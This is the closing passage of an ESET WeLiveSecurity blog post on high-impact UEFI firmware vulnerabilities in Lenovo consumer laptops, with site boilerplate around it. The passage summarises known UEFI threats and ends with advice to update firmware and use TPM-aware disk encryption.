<p>UEFI threats can be extremely stealthy and dangerous. They are executed early in the boot process, before transferring control to the operating system, which means that they can bypass almost all security measures and mitigations higher in the stack that could prevent their OS payloads from being executed. So, how do UEFI threats overcome all the security protections that have been created to prevent deployment or execution of UEFI threats themselves?</p>
<p>All of the real-world UEFI threats discovered in recent years (<a href="https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf" target="_blank" rel="noopener"><em>LoJax</em></a>, <a href="https://securelist.com/mosaicregressor/98849/" target="_blank" rel="noopener"><em>MosaicRegressor</em></a>, <a href="https://securelist.com/moonbounce-the-dark-side-of-uefi-firmware/105468/" target="_blank" rel="noopener"><em>MoonBounce</em></a>, <a href="https://www.welivesecurity.com/2021/10/05/uefi-threats-moving-esp-introducing-especter-bootkit/" target="_blank" rel="noopener"><em>ESPecter</em></a>, <a href="https://securelist.com/finspy-unseen-findings/104322/" target="_blank" rel="noopener"><em>FinSpy</em></a>) needed to bypass or disable the security mechanisms in some way in order to be deployed and executed. However, only in the case of <a href="https://www.welivesecurity.com/wp-content/uploads/2018/09/ESET-LoJax.pdf"><em>LoJax</em></a>, the first in-the-wild UEFI rootkit (discovered by ESET Research in 2018), do we have a clue how it was done ‚Äì by using the <span style="font-family: 'courier new', courier, monospace;">ReWriter_binary</span> capable of exploiting the <a href="https://bromiumlabs.files.wordpress.com/2015/01/speed_racer_whitepaper.pdf"><em>Speed Racer</em></a> vulnerability.</p>
<p>Even though vulnerabilities aren‚Äôt the only option for turning off or bypassing firmware security mitigations, there are many such vulnerabilities and due to the number of different firmware implementations and their complexity, many more are likely just waiting to be discovered.</p>
<p>Only in the last year, we have seen numerous high-impact UEFI firmware vulnerabilities being publicly disclosed. Most notable are those by the researchers from <a href="https://www.binarly.io/"><em>Binarly</em></a>, in their <a href="https://www.binarly.io/posts/An_In_Depth_Look_at_the_23_High_Impact_Vulnerabilities/index.html" target="_blank" rel="noopener"><em>An In-Depth Look At The 23 High-Impact Vulnerabilities</em></a> and <a href="https://www.binarly.io/posts/Repeatable_Firmware_Security_Failures_16_High_Impact_Vulnerabilities_Discovered_in_HP_Devices" target="_blank" rel="noopener"><em>16 High Impact Vulnerabilities Discovered In HP Devices</em></a> blogposts, and by researchers from <a href="https://www.sentinelone.com/" target="_blank" rel="noopener"><em>SentinelOne</em></a> in their <a href="https://www.sentinelone.com/labs/another-brick-in-the-wall-uncovering-smm-vulnerabilities-in-hp-firmware/" target="_blank" rel="noopener"><em>Another Brick in the Wall: Uncovering SMM Vulnerabilities in HP Firmware</em></a> blogpost.</p>
<p>Our discovery,<strong>¬†</strong>together with the above-mentioned ones, demonstrates that in some cases, deployment of UEFI threats might not be as difficult as expected, and the larger number of real-world UEFI threats discovered in the last years suggests that adversaries are aware of this.</p>
<p>Regarding the vulnerabilities described in this blogpost, we strongly advise all owners of Lenovo laptops, to go through the list of affected devices and update their firmware, ideally by <a href="https://support.lenovo.com/us/en/product_security/LEN-73440" target="_blank" rel="noopener"><em>following the manufacturer‚Äôs instructions</em></a>.</p>
<p>For those using End Of Development Support (EODS) devices affected by the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-3972" target="_blank" rel="noopener"><em>CVE-2021-3972</em></a>, without any fixes available: one thing that can help you protect against unwanted modification of the UEFI Secure Boot state is using a TPM-aware full-disk encryption solution capable of making disk data inaccessible if the UEFI Secure Boot configuration changes.</p>
<p><a class="no-fancy" href="https://www.eset.com/int/business/services/threat-intelligence/?utm_source=welivesecurity.com&amp;utm_medium=referral&amp;utm_campaign=wls-research&amp;utm_content=when-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops" target="_blank" rel="noopener"><img class="aligncenter wp-image-152551" src="https://www.welivesecurity.com/wp-content/uploads/2021/07/bandook-bandidos-eti-cta.png" alt="" width="899" height="290" srcset="https://www.welivesecurity.com/wp-content/uploads/2021/07/bandook-bandidos-eti-cta.png 918w, https://www.welivesecurity.com/wp-content/uploads/2021/07/bandook-bandidos-eti-cta-300x97.png 300w, https://www.welivesecurity.com/wp-content/uploads/2021/07/bandook-bandidos-eti-cta-768x248.png 768w" sizes="(max-width: 899px) 100vw, 899px" /></a></p>

                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/msmolar/" title="Martin Smol√°r">
                    Martin Smol√°r                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2022-04-19 11:30:02">19 Apr 2022 - 11:30AM</time>
                                    </span>
                                </div>
                            
                                <div class="widgets row">
        <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                <h3><span class="text"><em>Sign up to receive an email update whenever a new article is published in our <a href="https://www.welivesecurity.com/category/ukraine-crisis-digital-security-resource-center/" target="_blank" rel="noopener">Ukraine Crisis ‚Äì Digital Security Resource Center</a></em></span></h3>
            </div>
        </div>
        <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
            <form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
                <div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="TOPIC" value="We Live Security Ukraine Newsletter">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button class="button-flag">
                        Submit                    </button>
                </div>
            </form>
        </div>
    </div>
                                <div class="widgets row">
        <div class="col-md-12 col-sm-12 col-xs-12">
            <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                <h3><span class="text">Newsletter</span></h3>
            </div>
        </div>
        <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
            <form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
                <div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="NEWSLETTER" value="We Live Security">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button class="">
                        Submit                    </button>
                </div>
            </form>
        </div>
    </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/eset-research/" class="category-tag-btn">ESET Research</a>                                                <a href="https://www.welivesecurity.com/2022/04/13/eset-takes-part-global-operation-disrupt-zloader-botnets/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/04/zloader-botnets-disruption-eset-global-operation-623x415.jpg"
                                                         alt="When &#8220;secure&#8221; isn&#8217;t secure at all: High&#8209;impact UEFI vulnerabilities discovered in Lenovo consumer laptops">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/04/13/eset-takes-part-global-operation-disrupt-zloader-botnets/">
                                                    ESET takes part in global operation to disrupt Zloader botnets                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/eset-research/" class="category-tag-btn">ESET Research</a>                                                <a href="https://www.welivesecurity.com/2022/04/06/fake-eshops-prowl-banking-credentials-android-malware/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/04/android-malware-fake-online-stores-banking-logins-623x415.jpg"
                                                         alt="When &#8220;secure&#8221; isn&#8217;t secure at all: High&#8209;impact UEFI vulnerabilities discovered in Lenovo consumer laptops">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/04/06/fake-eshops-prowl-banking-credentials-android-malware/">
                                                    Fake e-shops on the prowl for banking credentials using Android malware                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/eset-research/" class="category-tag-btn">ESET Research</a>                                                <a href="https://www.welivesecurity.com/2022/03/28/under-hood-wslink-multilayered-virtual-machine/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/03/wslink-malware-virtual-machine-analysis-623x415.png"
                                                         alt="When &#8220;secure&#8221; isn&#8217;t secure at all: High&#8209;impact UEFI vulnerabilities discovered in Lenovo consumer laptops">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/03/28/under-hood-wslink-multilayered-virtual-machine/">
                                                    Under the hood of Wslink‚Äôs multilayered virtual machine                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/eset-research/" class="category-tag-btn">ESET Research</a>                                                <a href="https://www.welivesecurity.com/2022/03/24/crypto-malware-patched-wallets-targeting-android-ios-devices/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2022/03/crypto-malware-patched-wallets-targeting-android-iOS-thumbnail-623x415.jpg"
                                                         alt="When &#8220;secure&#8221; isn&#8217;t secure at all: High&#8209;impact UEFI vulnerabilities discovered in Lenovo consumer laptops">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2022/03/24/crypto-malware-patched-wallets-targeting-android-ios-devices/">
                                                    Crypto malware in patched wallets targeting Android and iOS devices                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy Policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

			<div class="social-wrapper-mobile hidden-lg hidden-md hidden-sm" id="mobile-article-sharer">
			<div class="col-xs-12">
				<div class="icons" style="text-align: center;">
											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2022%2F04%2F19%2Fwhen-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2022%2F04%2F19%2Fwhen-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2022%2F04%2F19%2Fwhen-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/js/main.js?id=fef3139dcedd23afc232"></script>
    <!-- Version: v1.9.0.9dc53e.pro.azeu -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"161350 https:\/\/backend.welivesecurity.com\/?p=161350","disqusShortname":"welivesecurity","disqusTitle":"When \u201csecure\u201d isn\u2019t secure at all: High\u2011impact UEFI vulnerabilities discovered in Lenovo consumer laptops","disqusUrl":"https:\/\/www.welivesecurity.com\/2022\/04\/19\/when-secure-isnt-secure-uefi-vulnerabilities-lenovo-consumer-laptops\/","postId":"161350"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>
